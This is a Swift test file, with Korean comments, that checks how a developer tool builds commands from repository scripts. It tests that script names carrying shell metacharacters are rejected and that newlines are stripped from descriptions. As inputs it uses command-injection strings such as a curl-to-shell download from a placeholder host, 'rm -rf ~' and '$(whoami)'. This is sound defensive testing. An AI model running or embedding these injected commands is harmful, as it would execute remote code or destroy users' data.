import Testing
@testable import muxa

/// 스크립트 → **실제 실행될 명령** 조립과, 그 재료(이름·설명)의 신뢰 경계 검증.
///
/// package.json·Makefile·scripts/ 는 **리포가 주는 값**이다. muxa는 적대적 리포를 여는 게 본업이라
/// 여기서 걸러내지 않으면 "클릭 한 번으로 채워지는 명령"이 곧 임의 명령 실행 경로가 된다.
struct ScriptCommandTests {
    private func script(_ name: String, body: String, source: ScriptSource) -> ProjectScript {
        ProjectScript(name: name, body: body, note: nil, source: source)
    }

    // MARK: 조립 정책 — 뷰가 아니라 ProjectScripts가 정한다

    @Test("package.json 스크립트는 패키지 매니저로 조립한다")
    func pkg는매니저로조립() {
        let s = script("dev", body: "vite", source: .packageJSON)
        #expect(ProjectScripts.command(for: s, manager: .pnpm) == "pnpm run dev")
        #expect(ProjectScripts.command(for: s, manager: .npm) == "npm run dev")
    }

    /// Makefile·셸 스크립트는 이미 완성된 명령이다 — 매니저를 끼얹지 않는다(`pnpm run make dev`는 헛소리).
    @Test("Makefile 타깃은 매니저와 무관하게 make 명령 그대로다")
    func make는그대로() {
        let s = script("dev", body: "make dev", source: .makefile)
        #expect(ProjectScripts.command(for: s, manager: .pnpm) == "make dev")
    }

    @Test("셸 스크립트는 경로 그대로다")
    func sh는그대로() {
        let s = script("dev", body: "./scripts/dev.sh", source: .shell)
        #expect(ProjectScripts.command(for: s, manager: .yarn) == "./scripts/dev.sh")
    }

    // MARK: 이름 화이트리스트 — 이름이 곧 명령이 된다(`pnpm run <이름>` · `make <이름>`)

    @Test("평범한 스크립트 이름은 통과한다")
    func 정상이름통과() {
        #expect(ProjectScripts.isValidName("dev"))
        #expect(ProjectScripts.isValidName("build:prod"))
        #expect(ProjectScripts.isValidName("test.e2e"))
        #expect(ProjectScripts.isValidName("dev-server_2"))
    }

    @Test("셸 메타문자가 든 이름은 거부한다")
    func 셸메타문자거부() {
        #expect(!ProjectScripts.isValidName("dev; curl evil.sh | sh"))
        #expect(!ProjectScripts.isValidName("dev && rm -rf ~"))
        #expect(!ProjectScripts.isValidName("$(whoami)"))
        #expect(!ProjectScripts.isValidName("de v"))
        #expect(!ProjectScripts.isValidName("dev'"))
        #expect(!ProjectScripts.isValidName(""))
    }

    /// 파싱 단계에서 걸러야 한다 — UI까지 흘러가면 클릭 한 번으로 명령칸에 꽂힌다.
    @Test("악성 이름의 package.json 스크립트는 목록에 아예 오르지 않는다")
    func 악성이름은목록에없다() {
        let json = #"{"scripts":{"dev":"vite","x; curl evil|sh":"echo hi"}}"#
        #expect(ProjectScripts.parsePackageScripts(json).map(\.name) == ["dev"])
    }

    @Test("악성 Makefile 타깃도 목록에 오르지 않는다")
    func 악성타깃은목록에없다() {
        let make = """
        dev: ## 개발
        \tgo run .
        x`whoami`: ## 이상한 타깃
        \techo hi
        """
        #expect(ProjectScripts.parseMakefile(make).map(\.name) == ["dev"])
    }

    // MARK: 제어문자·개행 제거 — 한 줄 미리보기가 payload를 접어 숨기는 것을 막는다

    @Test("설명의 개행·제어문자는 제거된다")
    func 설명의개행제거() {
        let json = #"{"scripts":{"dev":"vite"},"scripts-info":{"dev":"개발 서버\n\n\n     악의적인 위장"}}"#
        let note = ProjectScripts.parsePackageScripts(json).first?.note
        #expect(note == "개발 서버     악의적인 위장")
        #expect(note?.contains("\n") == false)
    }

    @Test("명령 본문의 개행·제어문자도 제거된다")
    func 본문의개행제거() {
        let json = #"{"scripts":{"dev":"vite\n# 안전해 보이는 줄"}}"#
        let body = ProjectScripts.parsePackageScripts(json).first?.body
        #expect(body?.contains("\n") == false)
    }

    @Test("sanitize는 앞뒤 공백을 정리하고 내용은 남긴다")
    func sanitize기본() {
        #expect(ProjectScripts.sanitize("  개발 서버  ") == "개발 서버")
        #expect(ProjectScripts.sanitize("a\tb") == "ab")
        #expect(ProjectScripts.sanitize("") == "")
    }
}
